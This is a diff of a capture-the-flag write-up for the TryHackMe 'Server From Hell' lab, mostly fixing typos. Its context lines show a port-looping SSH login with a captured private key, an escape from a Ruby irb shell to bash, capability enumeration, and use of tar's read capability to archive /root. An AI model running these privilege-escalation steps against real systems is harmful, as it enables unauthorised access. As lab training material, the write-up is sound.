@@ -53,7 +53,7 @@ $ nc <ip> 12345
 
 ### https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/
 
-### Here, I came to how to exploit misconfigured NFS.
+### Here, I came to know how to exploit misconfigured NFS.
 ![alt text](https://github.com/Soumyanil-Biswas/TryHackMe-The-Server-From-Hell/blob/main/images/5.showmount_usage.png?raw=true)
 
 ## 5.
@@ -81,7 +81,7 @@ $ nc <ip> 12345
 
 ### We also got a hint.txt ----> 2500-4500
 ### It will most probably be port numbers through which we can enter, probably ssh!?
-#### Believing that ssh is running,let us a port scanner to check ssh is running or not, if it is running, then we will login via those rsa key that we got previously, else we have to use nmap.
+#### Believing that ssh is running,let us a make port scanner to check ssh is running or not, if it is running, then we will login via those rsa key that we got previously, else we have to use nmap.
 &nbsp;
 ```
 #!/usr/bin/bash
@@ -91,13 +91,14 @@ do
         ssh -i id_rsa hades@10.10.251.32 -p $port
 done
 ```
-We got:
+Hell yaah!! We got a shell:
+
 &nbsp;
 ![alt text](https://github.com/Soumyanil-Biswas/TryHackMe-The-Server-From-Hell/blob/main/images/ssh_port_entry.png?raw=true)
 
 ### We can see that on port 3333, ssh was open...
 
-### Now we can see that we got a shell, but it is not bash or any other normal shell. After a quick Google search, I came to know this is a rubi shell.
+### Now we can see that we got a shell, but it is not bash or any other normal shell. After a quick Google search, I came to know this is a ruby shell.
 ### To get bash shell:
 ```
 irb(main):001:0> system("/bin/bash")
@@ -110,7 +111,7 @@ irb(main):001:0> system("/bin/bash")
 ### Now the last one.
 
 ### HINT: getcap
-### ---> Some how we will need getcap
+### ---> Some how we will be using getcap, OK!?
 ```
 hades@hell:~$ getcap
 usage: getcap [-v] [-r] [-h] <filename> [<filename> ...]
@@ -123,7 +124,7 @@ hades@hell:~$ getcap -r / 2> /dev/null
 /usr/bin/mtr-packet = cap_net_raw+ep
 /bin/tar = cap_dac_read_search+ep
 ```
-### Now we will use tar to escalate out priv.
+### Now we will use tar to escalate our priv.
 ```
 hades@hell:/tmp$ tar -cvf root.tar /root
 tar: Removing leading `/' from member names
